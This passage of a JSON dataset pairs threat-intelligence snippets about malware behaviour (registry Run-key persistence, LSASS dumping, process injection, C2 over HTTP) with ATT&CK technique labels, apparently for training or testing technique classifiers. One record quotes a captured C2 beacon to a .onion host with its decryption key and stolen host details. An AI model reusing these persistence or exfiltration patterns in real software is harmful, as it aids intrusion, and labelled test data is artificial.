    "type": "text",
    "text": "collects the OS system OS version MAC address and the computer name from the victims machine.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The first .CMD file set seen to use AutoIt in its execution",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "malware gathers system information via Windows Management Instrumentation (WMI).",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "can use WMI to delete files on a target machine.(Citation: FireEye FiveHands April 2021)",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "uses the command prompt to execute commands on the victim's machine.(Citation: Unit 42 OopsIE! Feb 2018)",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has used credential dumpers or stealers to obtain legitimate credentials which they used to gain access to victim accounts.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "creates a Registry subkey to register its created service and can also uninstall itself later by deleting this value. 's backdoor also enables remote attackers to modify and delete subkeys.(Citation: Symantec Trojan.Hydraq Jan 2010)",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "a batch file.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "uses HTTP over SSL to communicate commands with the control server.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "uninstaller can delete registry entries files and folders and finally itself once these tasks have been completed.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "actors obtain legitimate credentials using a variety of methods and use them to further lateral movement on victim networks.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "can identify processes based on PID.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has collected the victims external IP address.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "files were then deleted",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has used HTTP in communications with C2.(Citation: BitDefender Chafer May 2020)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "During  the threat actors collected data from compromised hosts.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "As a command line argument",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has used Task Scheduler to run programs at system startup or on a scheduled basis for persistence.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "via the shell “echo” commands.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "LSASS Dumping",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "used a registry run key to maintain persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "During  the threat actors used HTTP GET requests for C2.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has used various tools to steal files from the compromised host.(Citation: Symantec Chafer February 2018)",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "has used malware that searched for files with specific patterns.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "that had the remote desktop service enabled.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "can gather system information the computer name OS version drive and serial information from the victim's machine.(Citation: US-CERT Volgmer Nov 2017)(Citation: US-CERT Volgmer 2 Nov 2017)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "the injector is its ability to load an assembly into an unmanaged process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to use ipconfig to enumerate system network settings.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has established persistence by setting the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run key value for wdm to the path of the executable. It has also used the Registry entry HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run vpdn %ALLUSERPROFILE%\\%APPDATA%\\vpdn\\VPDN_LU.exe to establish persistence.(Citation: ZScaler Hacking Team)",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "the file deletion functions",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "can launch a remote command shell interface for executing commands.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "writes its encrypted C2\nconfiguration into the system’s registry",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "can download and execute a file.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has used the ShellExecute() function within a script.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Malware used by  is capable of remotely deleting files from victims.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "To establish persistence  can install itself as a new service named NtmSsvc.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "used ipconfig to gather network configuration information.(Citation: Malwarebytes Higaisa 2020)",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "contains a command to download and execute a file from a remotely hosted URL using WinINet HTTP requests.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "uses the Dropbox API to request two files one of which is the same file as the one dropped by the malicious email attachment. This is most likely meant to be a mechanism to update the compromised host with a new version of the  malware.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "the adversary used the valid account to directly login",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "the stolen credentials are used to reach high-value machines like servers",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to set a Registry key to run a cmd.exe command.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The file is then deleted from the disk",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "establishes persistence by adding a Registry Run key.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "when the WMI service was initiated",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "used scheduler and schtasks to create new tasks on remote hosts as part of lateral movement.(Citation: Volexity SolarWinds) They have manipulated scheduled tasks by updating an existing legitimate task to execute their tools and then returned the scheduled task to its original configuration.(Citation: FireEye SUNBURST Backdoor December 2020)  also created a scheduled task to maintain  persistence when the host booted during the 2020 SolarWinds intrusion.(Citation: CrowdStrike SUNSPOT Implant January 2021) They previously used named and hijacked scheduled tasks to also establish persistence.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "can enumerate the host name and OS version on a target system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "network traffic can communicate over HTTP.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "can search for specific files.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The command to get specific files",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "routinely removed their tools including custom backdoors once remote access was achieved.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "can collect and send OS version and computer name as a part of its C2 beacon.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "HTTP POST request that contains\nthe command output.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has used process hollowing to create and manipulate processes through sections of unmapped memory by reallocating that space with its malicious code. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "gains persistence by adding the Registry key HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "gathers the victim username.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "executes functions using rundll32.exe.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "has been used to execute remote commands.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "collects the username from the victims machine.(Citation: FireEye FELIXROOT July 2018)",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to execute shell commands on the compromised host.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "enumerates and collects the username from the victims machine.(Citation: Securelist Denis April 2017)",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "the actors gained access to a VMware service account with administrator and system level access",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "can use valid credentials with  or wmic to spread itself to remote systems.(Citation: Talos Nyetya June 2017)",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "can stage collected information including screen captures and logged keystrokes locally.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "System info, including both hardware and OS info.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can identify the IP of a targeted system.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has used CallWindowProc and EnumResourceTypesA to interpret and execute shellcode.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "s shellcode attempted to find the process ID of the current process.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can use cmd.exe to help execute commands on the system. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has deleted itself and the 'index.dat' file on a compromised machine to remove recent Internet history from the system.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "All captured information from the transaction is saved to an encrypted file placed in a directory previously set by the malware configuration",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "has sent emails containing malicious attachments that require users to execute a file or macro to infect the victim machine.(Citation: Talos Cobalt Group July 2018)",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "has queried the registry to detect recent PuTTY sessions.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Variants of  have added Run Registry keys to establish persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "to delete any remaining FOCUSFJORD\nforensic evidence, including files on disk, configuration data\nencrypted in the registry, and related services and registry keys\nused for persistence.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has functionality to remove Registry Run key persistence as a cleanup procedure.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to collect the IP address of an infected host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has added itself to the Registry key HKEY_CURRENT_USER\\Software\\Microsoft\\CurrentVersion\\Run\\ for persistence.(Citation: Unit 42 Bisonal July 2018) ",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "is designed to download an implant from a C2 server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "searches for files with specific file extensions.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The Threat actor also used valid accounts to create persistence within the environment",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "During  the threat actors used  on targeted systems.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "server component can upload local files.(Citation: FireEye Periscope March 2018)(Citation: Lee 2013)",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "The final payload returned is a lightweight PowerShell backdoor,",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can download additional payloads from C2.(Citation: CISA SoreFang July 2016)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "This is sent to the server along with the computer’s name",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has been installed using a .bat file.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "POST /api/osx/started HTTP/1.1Host: r2elajikcosf7zee.onion.toAccept: */*Content-Length: 233Content-Type: application/x-www-form-urlencodedbot_id=9a8965ba04e72909f36c8d16aa801794c6d905d045c2b704e8f0a9bbb97d3eb8&amp;data=psX0DKYB0u...5TximyY%2BQY%3D     Figure 10: Malware sending initial information       &gt; rc4decrypt(base64decode(\"psX0DKYB0u...5TximyY+QY=\"), \"u2RLhh+!LGd9p8!ZtuKcN\")device_model=MacBookPro9,2bot_version=1.3.5build_name=elitef*ckos_version=15.5.0ip_address=4.5.6.7has_root=0     Figure 11: Decoded data sent to C&C The bot_id is constructed by hashing the following values with SHA-256:  The hardware UUID (IOPlatformUUID) The system serial number (IOPlatformSerialNumber) The model identifier of the Mac (e.g.:MacBookPro9,2)  Most actions are self-explanatory",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "malware gathers the Address Resolution Protocol (ARP) table from the victim.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "HTTP Parent Beacon",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "writes multiple outputs to a TMP file using the >> method.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "has used various API calls as part of its checks to see if the malware is running in a sandbox.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "looks for specific files and file types.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "DLL was executed using rundll32.exe :\nC:\\Windows\\system32\\cmd.exe /c D:\\max\\eyewear.bat\r\n\t➝ rundll32",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "malware has created scheduled tasks to establish persistence.(Citation: FireEye FIN7 April 2017)(Citation: Morphisec FIN7 June 2017)(Citation: FireEye FIN7 Aug 2018)",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "has used rundll32.exe for execution.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "has used shellcode which reads code stored in the registry keys \\REGISTRY\\SOFTWARE\\Microsoft\\DRM using the native Windows API as well as read HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Interfaces as part of its C2.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "establishes persistence by creating a service and naming it based off the operating system version running on the current machine.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "I download my tools from GitHub, and so do my victims",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "WMI activity [T1546.003] was also observed to execute commands on the systems.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Injects ma32.dll into “wwahost.exe” or “audacity.exe”",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has used cmd /c commands embedded within batch scripts. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can enumerate the process it is currently running under.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can execute a WMI query to gather information about the installed antivirus engine.(Citation: Cybereason Bazar July 2020)",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "can list the running processes and get the process ID and parent processs ID.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "uses a batch file to load a DLL into the svchost.exe process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The reconnaissance modules used with  can collect information on network configuration.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "deletes the .LNK file from the startup directory as well as the dropper components.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "can identify the IP and MAC addresses of the compromised host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has used the FindNextFile command as part of its file deletion process.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "a given command line.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "DeleteRegistryValue",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "has identified the IP address of a compromised host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "used scheduler and schtasks to create new tasks on remote hosts as part of lateral movement.(Citation: Volexity SolarWinds) They also manipulated scheduled tasks by updating an existing legitimate task to execute their tools and then returned the scheduled task to its original configuration.(Citation: FireEye SUNBURST Backdoor December 2020)  also created a scheduled task to maintain  persistence when the host booted. ",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "the malware first creates a syscall table for NT APIs",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "lures victims into executing malicious macros embedded within Microsoft Excel documents.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "used  to download additional files.(Citation: FireEye APT41 March 2020)(Citation: Crowdstrike GTR2020 Mar 2020)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "to terminate security-related processes and services by dropping KILLAV",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "has executed HTA files via cmd.exe and used batch scripts for collection.(Citation: Anomali MUSTANG PANDA October 2019)",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can delete previously exfiltrated files from the compromised host.(Citation: Talos Promethium June 2020)",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has resolved the path of a process PID to use as a script argument.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "achieved persistence by placing a malicious executable in the startup directory and has added the HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run key to the Registry.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "this CMD file calls the \"db\" file. In both samples,",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can identify system information including battery status.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "malware\nalso checks that the operating system version",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "gathers system configuration information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has stored captured credential information in a file named pi.log.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "can collect the user name from a compromised host.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "This marker indicates the presence of an encrypted MZ marker in the .hwp file and is decrypted by the malware and written to the Startup folder for the user:  C:\\Documents and Settings\\<username>\\Start Menu\\Programs\\Startup\\viso.exe  This step establishes the persistence of the malware across reboots on the endpoint Once the decrypted MZ marker is written to the Startup folder, the 2.hwp is deleted from the endpoint  The malware might perform this activity for a couple of reasons:  Establish persistence for itself on the endpoint Establish persistence of another component of the malware on the endpoint Update itself on endpoint after a separate updater component downloads the update from the control server  The malware has limited reconnaissance and data-gathering capabilities and is not full-fledged spyware",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has lured victims to launch malicious attachments delivered via spearphishing emails (often sent from compromised accounts).(Citation: FireEye Hacking FIN4 Dec 2014)",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "the user clicks on the malicious link or opens the attachment.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "gathers the IP address from the victims machine.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has deleted the initial dropper after running through the environment checks.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "downloading and executing two other PowerShell scripts from a different attacker-controlled server",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can stage data prior to exfiltration in %APPDATA%\\Microsoft\\UserSetting and %APPDATA%\\Microsoft\\UserSetting\\MediaCache.(Citation: Eset Ramsay May 2020)",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "searches the Registry for indicators of security programs.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "can collect the computer name and OS version from the system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "used to download and execute an IcedID loader.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Creates two registry keys for persistence",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "registers itself as a service by adding several Registry keys.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "had a command to delete files.(Citation: FireEye SUNBURST Backdoor December 2020)",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has copied files of interest to the main drive's recycle bin.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "Instead of using systeminfo and tasklist commands, the C# variant of Zebrocy uses WMI queries to gather this information",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "malware uses cmd.exe to execute commands on a compromised host.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware)(Citation: McAfee Lazarus Resurfaces Feb 2018)(Citation: US-CERT SHARPKNOT June 2018)(Citation: Qualys LolZarus) A Destover-like variant used by  uses a batch file mechanism to delete its binaries from the system.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "uses command line for execution.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has downloaded additional malware and tools onto a compromised host.(Citation: Palo Alto Gamaredon Feb 2017)(Citation: TrendMicro Gamaredon April 2020)(Citation: ESET Gamaredon June 2020)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "If Adobe Flash or Microsoft Silverlight is no longer required, DHS recommends that those applications be removed from systems.The IOCs provided with this alert include IP addresses determined to be part of the HIDDEN COBRA botnet infrastructure, identified as DeltaCharlie",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "can execute shell commands on a compromised host.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "You can see that in addition to the code, the author copy-pasted English typos such as \"IE Registery\":PDB PathsWe can clearly identify a pattern in the PDB naming convention of all the binaries mentioned in this article.ROKRAT:e:\\Happy\\Work\\Source\\version 12\\T+M\\Result\\DocPrint.pdb (from the \"Evil New Year\" campaign)d:\\HighSchool\\version 13\\2ndBD\\T+M\\T+M\\Result\\DocPrint.pdb (from the \"North Korean Human Rights\" campaignD:\\HighSchool\\version 13\\First-Dragon(VS2015)\\Sample\\Release\\DogCall.pdb (ROKRAT Sample from an unidentified campaign from June)Wiper:D:\\HighSchool\\version 13\\VC2008(Version15)\\T+M\\T+M\\TMProject\\Release\\ErasePartition.pdb (From the \"Are You Happy?\" campaign)Summary GraphHere is a graph to visualize the similarities and differences between each campaign mentioned in this article:ConclusionSouth Korea is becoming an important target for malicious actors and the techniques used are becoming specific to the region (for example: use of native language to try and ensure the targets feel that the information, document or email being sent to them has added legitimacy)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "used the IsDebuggerPresent OutputDebugString and SetLastError APIs to avoid debugging.  used GetProcAddress and LoadLibrary to dynamically resolve APIs.  also used the Wow64SetThreadContext API as part of a process hollowing process.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "can search the registry of a compromised host.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "opens a socket on port 22 and if it receives a response it attempts to obtain the machine's hostname and Top-Level Domain. ",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "can be found in the two bytes of the HTTP payload",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "can use HTTP POST and GET requests to send and receive C2 information.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "malware can deactivate security mechanisms in Microsoft Office by editing several keys and values under HKCU\\Software\\Microsoft\\Office\\.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "has collected a list of files from the victim and uploaded it to its C2 server and then created a new list of specific files to steal.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has downloaded additional malware to execute on victim systems.(Citation: Cybereason TA505 April 2019)(Citation: Deep Instinct TA505 Apr 2019)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "downloads a tar compressed archive from a download server to the system.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to download and execute additional payloads.(Citation: BlackBerry CostaRicto November 2020)(Citation: FireEye FiveHands April 2021)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can download additional files from the C2 server for execution.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has used cmd.exe to run its self deletion routine.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "gathers information about the OS architecture OS name and OS version/Service pack.(Citation: Lazarus RATANKBA)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "to execute Procdump, which was used to dump lsass.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "queries several Registry keys to identify hard disk partitions to overwrite.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "The following files are downloaded and written to disk:",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to identify the IP address of the compromised host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "had commands that allow an attacker to write or delete registry keys and was observed stopping services by setting their HKLM\\SYSTEM\\CurrentControlSet\\services\\\\[service_name]\\\\Start registry entries to value 4.(Citation: FireEye SUNBURST Backdoor December 2020)(Citation: Microsoft Analyzing Solorigate Dec 2020) It also deleted previously-created Image File Execution Options (IFEO) Debugger registry values and registry keys related to HTTP proxy to clean up traces of its activity.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "can add the name of its communication pipe to HKLM\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\lanmanserver\\\\parameters\\NullSessionPipes.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "has set the run key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run for persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "actors used a legitimate admin account to remotely log on to the domain controller",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "the threat actor was making authentications to O365",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "can download files and execute them on the victims machine.(Citation: Talos Konni May 2017) ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "checked that HKU\\SOFTWARE\\Microsoft\\CTF existed before decoding its embedded payload.(Citation: FireEye SUNBURST Backdoor December 2020) ",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "has collected the IP address and network adapter information from the victims machine.(Citation: Securelist Darkhotel Aug 2015)",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has checked for the existence of a Service key to determine if it has already been installed on the system.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "These files are downloaded to a directory (C:\\Users\\Public\\Libraries\\tempsys) on the infected machine by Bxaki() and xparis()",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has used C:\\Windows\\Debug and C:\\Perflogs as staging directories.(Citation: FireEye Periscope March 2018)",
    "command": "",
